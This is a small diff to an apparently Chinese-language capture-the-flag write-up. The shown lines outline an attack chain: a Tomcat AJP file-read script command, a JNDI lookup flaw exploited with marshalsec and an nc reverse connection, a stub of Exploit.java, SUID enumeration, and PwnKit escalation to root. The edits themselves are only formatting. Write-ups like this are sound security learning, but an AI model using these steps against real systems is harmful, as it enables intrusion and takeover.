@@ -63,10 +63,11 @@ python3 tomcat-ajp-lfi.py ip -p 8009 -f WEB-INF/web.xml
 发现连不上问了才知道是移位密码jndi.jsp
 然后进入对应页面
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603272112518.png)
-发现存在jndilookup漏洞，可以用nc回连
+发现存在jndi lookup漏洞，可以用nc回连
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603272123359.png)
 找到并编译marshalsec
 ### 写Exploit.java
+
 ```java
 public class Exploit {
     static {
@@ -272,3 +273,5 @@ find / -perm -4000 -type f 2>/dev/null
 - 升级 tty
 - 枚举 → 发现 pkexec
 - 利用 PwnKit → root
+
+## wp总结
